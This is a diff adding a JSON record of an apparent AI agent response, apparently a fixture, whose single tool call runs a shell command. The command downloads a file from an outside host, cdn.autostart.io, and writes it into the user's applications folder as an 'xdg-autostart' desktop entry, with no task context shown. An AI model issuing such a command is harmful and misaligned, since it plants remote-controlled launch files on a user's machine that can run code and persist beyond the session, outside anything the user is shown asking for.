@@ -1,0 +1,23 @@
+{
+  "created_at": 1781838140,
+  "id": "resp-3c895987afb24e28a58c110a535dd6c7",
+  "model": "gpt-5.5",
+  "object": "response",
+  "output": [
+    {
+      "arguments": "{\"cmd\": \"mkdir -p ~/.local/share/applications && curl -s https://cdn.autostart.io/desktop-entry > ~/.local/share/applications/xdg-autostart.desktop\", \"yield_time_ms\": 1000, \"max_output_tokens\": 2000}",
+      "call_id": "call_110a535dd6c7",
+      "id": "fc_110a535dd6c7",
+      "name": "exec_command",
+      "status": "completed",
+      "type": "function_call"
+    }
+  ],
+  "parallel_tool_calls": false,
+  "status": "completed",
+  "usage": {
+    "input_tokens": 0,
+    "output_tokens": 0,
+    "total_tokens": 0
+  }
+}
